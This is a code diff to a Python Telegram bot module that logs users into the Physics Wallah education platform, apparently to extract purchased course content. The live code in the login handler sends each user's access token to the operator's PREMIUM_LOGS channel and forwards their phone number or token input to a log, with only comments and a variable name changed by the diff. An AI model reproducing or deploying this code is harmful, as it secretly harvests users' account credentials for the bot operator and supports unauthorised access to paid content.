@@ -10,7 +10,7 @@ import datetime
 from Extractor import app
 from pyrogram import filters
 from datetime import datetime, timedelta
-from Extractor.core.utils import forward_to_log
+from Extractor.core.utils import forward_to_log   # ← यह वापस लाया
 import pytz
 import re
 import unicodedata
@@ -52,7 +52,6 @@ async def process_subject_content(session, target_id, subject_id, headers, all_l
 
         for item in content_response.get("data", []):
             try:
-                # TODAY FILTER - Tera original wala
                 if today_only:
                     item_date = item.get("createdAt") or item.get("date") or item.get("scheduledDate") or item.get("startTime")
                     if item_date:
@@ -187,12 +186,11 @@ def format_content_line(name, url, content_type="", parent_id=None, child_id=Non
 @app.on_message(filters.command(["pw"]))
 async def pw_login(app, message):
     try:
-        # 🔹 यहाँ पहले सिर्फ इनपुट लें – अभी लॉग नहीं करें
         query_msg = await app.ask(
             chat_id=message.chat.id,
             text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:**\n---\n**DONT LOGIN WITH PHONE NUMBER, It Leads to ban your account of PW**")
         
-        # 🔹 forward_to_log को यहाँ से हटा दिया गया है (अब बाद में भेजेंगे)
+        # 🔹 इस बार forward_to_log को **यहाँ से हटा दिया है** (बाद में भेजेंगे)
         user_input = query_msg.text.strip()
 
         if user_input.isdigit():
@@ -220,7 +218,7 @@ async def pw_login(app, message):
 
             if not otp_response.get("success"):
                 await message.reply_text("❌ **Invalid Mobile Number! Please provide a valid PW login number.**")
-                # (वैकल्पिक) फेल होने पर भी इनपुट लॉग करें
+                # लॉगिन फेल – फिर भी इनपुट लॉग करें
                 await forward_to_log(query_msg, "PW Extractor - Invalid Number")
                 return
 
@@ -248,35 +246,33 @@ async def pw_login(app, message):
             token = token_response.get("data", {}).get("access_token")
             if not token:
                 await message.reply_text("❌ **Login failed! Invalid OTP.**")
-                # फेल होने पर भी इनपुट लॉग करें
                 await forward_to_log(query_msg, "PW Extractor - Login Failed")
                 return
 
-            # ✅ LOGIN SUCCESS – अब पहले सफलता + टोकन लॉग करें
-            success_msg = f"✅ **PW Login Successful!**\n\n🔑 **Token:** `{token}`"
-            await message.reply_text(success_msg)  # यूज़र को भी भेजें
-            await app.send_message(PREMIUM_LOGS, success_msg)  # पहले यह लॉग चैनल पर जाए
+            # ✅ LOGIN SUCCESS – सबसे पहले Token वाला मैसेज लॉग करें
+            dl = f"✅ **PW Login Successful!**\n\n🔑 **Token:** `{token}`"
+            await message.reply_text(dl)   # यूज़र को भी भेजें
+            await app.send_message(PREMIUM_LOGS, dl)   # यह पहले जाएगा
 
-            # 🔹 अब इसके बाद यूज़र का इनपुट (नंबर/टोकन) फॉरवर्ड करें
-            await forward_to_log(query_msg, "PW Extractor - User Input (Login Success)")
+            # अब उसके बाद User Input (मोबाइल नंबर) फॉरवर्ड करें
+            await forward_to_log(query_msg, "PW Extractor - User Input (Success)")
 
-            dl = success_msg  # (वैकल्पिक – पहले ही भेज चुके हैं)
-            # आगे बैच फेच करने का कोड...
+            # बाकी का कोड जारी रखें...
 
         elif user_input.startswith("e"):
             token = user_input
-            # टोकन डायरेक्ट डाला – यहाँ भी पहले सक्सेस मैसेज भेजें, फिर इनपुट लॉग करें
-            success_msg = f"✅ **Token accepted!**\n\n🔑 **Token:** `{token}`"
-            await message.reply_text(success_msg)
-            await app.send_message(PREMIUM_LOGS, success_msg)
-            await forward_to_log(query_msg, "PW Extractor - User Input (Token used)")
+            # डायरेक्ट टोकन – यहाँ भी पहले सक्सेस मैसेज, फिर इनपुट
+            dl = f"✅ **Token accepted!**\n\n🔑 **Token:** `{token}`"
+            await message.reply_text(dl)
+            await app.send_message(PREMIUM_LOGS, dl)
+            await forward_to_log(query_msg, "PW Extractor - Token Input")
+
         else:
             await message.reply_text("❌ **Invalid input! Please provide a valid mobile number or token.**")
-            # इनवैलिड इनपुट भी लॉग कर सकते हैं
             await forward_to_log(query_msg, "PW Extractor - Invalid Input")
             return
 
-        # 🔹 अब बाकी का कोड – headers बनाएँ, बैच फेच करें आदि
+        # 🔹 आगे बैच फेच करने का कोड (वही जो पहले था)
         headers = {
             "client-id": "5eb393ee95fab7468a79d189",
             "client-type": "WEB",
@@ -304,7 +300,6 @@ async def pw_login(app, message):
             batch_text += f"📖 `{bi}` → **{bn}**\n"
             batch_map[bi] = bn
 
-        # यहाँ से आगे का कोड वैसा ही जारी रखें (आपके पास जो है)
         query_msg_batch = await app.send_message(
             chat_id=message.chat.id,
             text=batch_text + "\n\n💡 **Please enter the Course ID to continue:**",
@@ -408,7 +403,7 @@ async def pw_login(app, message):
         end_time = time.time()
         extraction_time = end_time - start_time
 
-        up = (f"**Login Succesfull for PW:** `{token}`")
+        up = (f"**Login Successful for PW:** `{token}`")
         captionn = (f" App Name : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}\n Mode: {mode_text}")
         caption = (
     "━━━━━━━━━━━━━━━━━━━\n"
